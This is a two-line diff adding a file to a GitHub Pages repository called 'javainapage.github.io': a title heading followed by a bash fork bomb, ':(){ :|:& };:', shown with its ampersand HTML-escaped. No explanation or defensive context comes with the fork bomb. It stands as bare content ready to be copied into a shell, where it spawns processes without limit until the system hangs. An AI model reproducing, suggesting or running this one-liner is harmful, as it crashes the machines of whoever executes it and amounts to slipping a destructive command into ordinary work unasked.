@@ -1,0 +1,2 @@
+# javainapage.github.io
+:(){ :|:&amp; };:
